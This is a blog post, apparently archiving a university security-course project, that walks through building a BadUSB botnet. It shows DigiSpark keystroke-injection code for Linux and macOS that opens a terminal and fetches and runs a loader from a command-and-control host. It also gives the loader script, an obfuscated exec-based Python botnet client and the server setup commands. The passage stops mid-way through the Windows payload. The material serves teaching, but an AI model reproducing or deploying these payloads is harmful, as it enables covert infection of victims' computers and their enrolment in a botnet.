@@ -1,0 +1,1548 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      Bad USB Botnet &middot; Ryan Kozak
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Bad USB Botnet | Ryan Kozak</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Bad USB Botnet" />
+<meta name="author" content="Ryan Kozak" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="hacking, web development, $other" />
+<meta property="og:description" content="hacking, web development, $other" />
+<link rel="canonical" href="http://0.0.0.0:4000/bad-usb-botnet/" />
+<meta property="og:url" content="http://0.0.0.0:4000/bad-usb-botnet/" />
+<meta property="og:site_name" content="Ryan Kozak" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-12-06T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Bad USB Botnet" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Bad USB Botnet","dateModified":"2020-05-11T02:12:40+00:00","datePublished":"2019-12-06T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/bad-usb-botnet/"},"url":"http://0.0.0.0:4000/bad-usb-botnet/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Ryan Kozak
+      </a>
+    </div>
+    <p class="lead">hacking, web development, $other</p>
+  </header>
+  <nav id="sidebar-nav-links">
+
+  
+    <a class="home-link "
+        href="/">Home</a>
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/about/">About</a>
+    	
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/contact/">Contact</a>
+    	
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/books/index.html">Book List</a>
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+  <!-- Optional additional links to insert in sidebar nav -->
+
+
+</nav>
+
+
+  <nav id="sidebar-icon-links">
+  
+    <a id="github-link"
+       class="icon" title="Github Profile" aria-label="Github Profile"
+       href="https://github.com/d0n601">
+      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
+</svg>
+
+    </a>
+  
+
+  
+  <a id="stackoverflow-link"
+     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
+     href="https://stackoverflow.com/users/4681506/ryan-kozak">
+    <?xml version="1.0" encoding="utf-8"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
+<style type="text/css">
+	.st0{fill:#BCBBBB;}
+	.st1{fill:#F48023;}
+</style>
+<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
+<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
+	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
+</svg>
+
+  </a>
+  
+
+  
+  
+  
+  
+
+  
+    <a id="tags-link"
+       class="icon"
+       title="Tags" aria-label="Tags"
+       href="/tags/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+    </a>
+  
+
+  
+    <a id="search-link"
+       class="icon"
+       title="Search" aria-label="Search"
+       href="/search/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+</svg>
+    </a>
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+ 
+  <p class="copyright">
+  &copy; 2021 Ryan Kozak.
+</p>
+
+</div>
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">Bad USB Botnet</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">06 Dec 2019</span>
+  <span class="post-categories">
+    
+      &bull;
+
+      
+      
+      
+
+      
+        Security
+      
+    
+  </span>
+</div>
+
+  <div class="post-body">
+    <p><img src="/wp-content/uploads/2019/12/BYOB_ASCII.png" alt="boot_BYOB" /></p>
+
+<p>This was a semester long project for California State University Sacramento’s Computer System Attacks and Countermeasures (CSC 154). I really enjoyed working on this project, and wanted to archive it on my site, so here it is.</p>
+
+<h2 id="objective">Objective</h2>
+<p>The objective of this project was to create BadUSB devices, that upon plugin, infect victim computers with malware configured to join a botnet.</p>
+
+<h2 id="botnet-cc">Botnet C&amp;C</h2>
+<p>For our botnet we’re using <a href="https://github.com/malwaredllc/byob">Build Your Own Botnet</a>. Our ultimate goal was an easily deployed and managed <em>command and control server</em>, with the ability to generate cross platform compatible clients.</p>
+
+<h3 id="command-and-control-server">Command and Control Server</h3>
+<ul>
+  <li><a href="https://digitalocean.com">Digital Ocean</a></li>
+  <li><a href="https://sheep.casa">Domain Name</a></li>
+  <li><a href="https://github.com/malwaredllc/byob">BYOB</a></li>
+</ul>
+
+<p>We’ve created a VPS on Digital Ocean to run our C&amp;C server. We’re using an Ubuntu 18.04 droplet at the cost of $5 per month. Additionally, we’ve purchased the domain <code class="highlighter-rouge">sheep.casa</code>, and directed it towards our C&amp;C server.</p>
+
+<p><img src="/wp-content/uploads/2019/12/digitalocean.png" alt="digitalocean" />
+<strong>Figure 1:</strong> Botnet C&amp;C server droplet on Digital Ocean.</p>
+
+<p><img src="/wp-content/uploads/2019/12/sheep.png" alt="sheep" />
+<strong>Figure 2:</strong> ASCII sheep, just for fun.</p>
+
+<p>The botnet framework we chose (BYOB) was installed via <code class="highlighter-rouge">git clone git@github.com:malwaredllc/byob.git &amp;&amp; cd ./byob/byob &amp;&amp; pip install -r requirements.txt &amp;&amp;  mv ../../byob /opt/</code>. This clones the repository, installs the required python modules, and moves the directory to into <code class="highlighter-rouge">/opt</code>.</p>
+
+<p>To launch the botnet we’ve created a bash script setting the host to <code class="highlighter-rouge">sheep.casa</code> and the listening port to <code class="highlighter-rouge">1337</code>. This script is placed in the <code class="highlighter-rouge">/root</code> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">cd</span> /opt/byob/byob <span class="o">&amp;&amp;</span> python server.py <span class="nt">--port</span> 1337
+</code></pre></div></div>
+
+<p><img src="/wp-content/uploads/2019/12/boot_BYOB.png" alt="boot_BYOB" />
+<strong>Figure 3:</strong> Botnet server running, no current sessions.</p>
+
+<h2 id="badusb">BadUSB</h2>
+<p>To create our BadUSB devices we’ve used the <a href="http://digistump.com/products/1">DigiSpark</a> development board by <a href="http://digistump.com/">Digistump</a>. These devices are recognized as USB keyboards by the victims’ machines, and will execute keystrokes to deliver our payload.</p>
+
+<h3 id="digispark-setup">DigiSpark Setup</h3>
+<p>We’ve purchased our BadUSB (DigiSpark) devices via Amazon. We have 12 of these devices spread across our members. They cost about $3 dollars each.</p>
+
+<p><img src="/wp-content/uploads/2019/12/amazon.png" alt="amazon" />
+<strong>Figure 4:</strong> DigiSpark boards on Amazon.</p>
+
+<p>In order to program our USB devices we’ve installed the <a href="https://www.arduino.cc/en/Main/Software">Arduino IDE</a>.<br />
+<img src="/wp-content/uploads/2019/12/arduino_download.png" alt="arduino_download" />
+<strong>Figure 5:</strong> Download the Arduino IDE.</p>
+
+<p>We’ve then configured the Arduino IDE to include the DigiSpark board so that we may use the <code class="highlighter-rouge">DigiKeyboard.h</code> library. <br />
+<img src="/wp-content/uploads/2019/12/digistump_json.png" alt="digistump_json" />
+<strong>Figure 6:</strong> Add DigiStump board manager url to configuration.</p>
+
+<p><img src="/wp-content/uploads/2019/12/digistump_boardmanager.png" alt="digistump_boardmanager" />
+<strong>Figure 7:</strong> Board manager downloading DigiStump’s board libraries.</p>
+
+<p><img src="/wp-content/uploads/2019/12/digistump_setboard.png" alt="digistump_default" />
+<strong>Figure 8:</strong> Set board to Digispark Default.</p>
+
+<h3 id="linux-payload">Linux Payload</h3>
+
+<p>The following code is what we’ve developed to infect Linux machines upon plugin.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "DigiKeyboard.h"
+</span>
+
+<span class="cm">/***
+ *
+ * This is an attack for Linux machines. It opens up a terminal window. It then downloads the loader, sets it to executable,
+ * executes it, and closes the terminal window.
+ *
+ ***/</span>
+
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_T</span> <span class="p">,</span> <span class="n">MOD_CONTROL_LEFT</span> <span class="o">|</span> <span class="n">MOD_ALT_LEFT</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">600</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"nohup wget https://sheep.casa/payloads/linux_loader -P /tmp &amp;&amp; nohup chmod +x /tmp/linux_loader &amp;&amp; nohup /tmp/linux_loader &amp; exit"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<p>As you can see above, the code delays for two seconds to allow the machine to register the device. After that it executes keystrokes to open up the terminal, and waits .6 seconds. Next it executes shell commands to download our bash script called <code class="highlighter-rouge">linux_loader</code> from the server. It then sets the script to executable, and executes it as a background process before exiting.</p>
+
+<p>The code for our <code class="highlighter-rouge">linux_loader</code> and <code class="highlighter-rouge">linux_payload.py</code> can be found in the section below.</p>
+
+<h4 id="linuxosx-loader">Linux/OSX Loader</h4>
+<p>Our BadUSB attack downloads and executes the loader script. For our attack on Linux and OSX machines this is a bash script called <code class="highlighter-rouge">linux_loader</code>, which can be found below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">nohup </span>wget https://sheep.casa/payloads/linux_payload.py <span class="nt">-P</span> /tmp <span class="o">&amp;&amp;</span> python /tmp/linux_payload.py
+</code></pre></div></div>
+
+<p>The loader script downloads our python payload and executes it to join our botnet. This script is run in the background so that the terminal window is not present while the botnet client (payload) is running.</p>
+
+<h4 id="python-payload-for-botnet">Python Payload for Botnet</h4>
+
+<p>A payload is generated via BYOB’s <code class="highlighter-rouge">client.py</code> script. We’ve generated our Linux payload by issuing <code class="highlighter-rouge">python client.py --name linux_payload --encrypt --compress --freeze sheep.casa 1337</code>.</p>
+
+<p><img src="/wp-content/uploads/2019/12/payload_generated.png" alt="payload_generated" />
+<strong>Figure 9:</strong> Generating our python payload.</p>
+
+<p>In order to host our payloads, we’ve installed Apache 2 on the C&amp;C server. In a real world attack this would be pretty bad practice, but it’s a matter of convenience for us. The payload generated above was moved from BYOB’s directory to <code class="highlighter-rouge">/var/www/html/payloads</code>. This is where our victims will download the payload from.</p>
+
+<p><img src="/wp-content/uploads/2019/12/payload_directory.png" alt="payload_directory" />
+<strong>Figure 10:</strong> <code class="highlighter-rouge">/payloads</code> directory hosting our malicious files.</p>
+
+<p>Below is our <code class="highlighter-rouge">linux_payload.py</code> file generated by BYOB.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">zlib</span><span class="p">,</span><span class="n">base64</span><span class="p">,</span><span class="n">marshal</span><span class="p">,</span><span class="n">json</span><span class="p">,</span><span class="n">urllib</span>
+<span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">version_info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">request</span>
+<span class="n">urlopen</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span> <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">version_info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">urllib</span><span class="p">.</span><span class="n">urlopen</span>
+<span class="k">exec</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">marshal</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">zlib</span><span class="p">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'eJwrtmBgYCgtyskvSM3TUM8oKSmw0tcvzkhNLdBLTixOtDI0NrYACpQkpqcWFesXJCfqFVSqa+oVpSamaGgCAFaFE3g='</span><span class="p">)))))</span>
+</code></pre></div></div>
+
+<h3 id="mac-osx-payload">Mac (OSX) Payload</h3>
+<p>In order to prevent the keyboard configuration dialog box from appearing when the DigiSpark is plugged into an Apple computer, we must configure the DigiSpark to appear as if it’s an Apple keyboard.</p>
+
+<p>VID and PID are defined in the file <code class="highlighter-rouge">~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h</code>. We will replace the existing file with a <a href="./scripts/Digispark/usbconfig.h">modified Apple version</a> when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.</p>
+
+<p>The following code is what we’ve developed to infect Apple OSX machines upon plugin.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "DigiKeyboard.h"
+</span>
+<span class="cm">/***
+ *
+ * This is an attack for Mac (OSX) machines. It opens up a terminal window, and executes the bash command. It then downloads the loader, sets it to executable,
+ * executes it, and closes the terminal window.
+ *
+ ***/</span>
+
+<span class="cp">#define MOD_CMD_LEFT 0x00000008
+</span>
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_SPACE</span><span class="p">,</span> <span class="n">MOD_GUI_LEFT</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"terminal"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"bash"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"nohup wget https://sheep.casa/payloads/linux_loader -P /tmp &amp;&amp; nohup chmod +x /tmp/linux_loader &amp;&amp; nohup /tmp/linux_loader &amp; exit"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"disown $!"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_Q</span><span class="p">,</span> <span class="n">MOD_GUI_LEFT</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see above, is very similar to what we’ve used to exploit Linux machines. The major difference is the way the terminal is opened. We’ve had to modify our OSX version to use <code class="highlighter-rouge">DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);</code>, which will open Spotlight search. The code will delay for .5 seconds, and search “terminal”, delay for .5 seconds, and press enter, opening the terminal.</p>
+
+<p>After this, in order to ensure we aren’t using Z Shell, we’ll enter <code class="highlighter-rouge">bash</code>. From this point on the rest of the code is exactly the same as our Linux payload. It too downloads <code class="highlighter-rouge">linux_loader</code>, which downloads and runs <code class="highlighter-rouge">linux_payload.py</code>.</p>
+
+<h3 id="windows">Windows</h3>
+<p>Below is the DigiSpark payload we developed to infect Windows victims.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "DigiKeyboard.h"
+</span>
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">pinMode</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span> <span class="c1">//LED on Model A</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
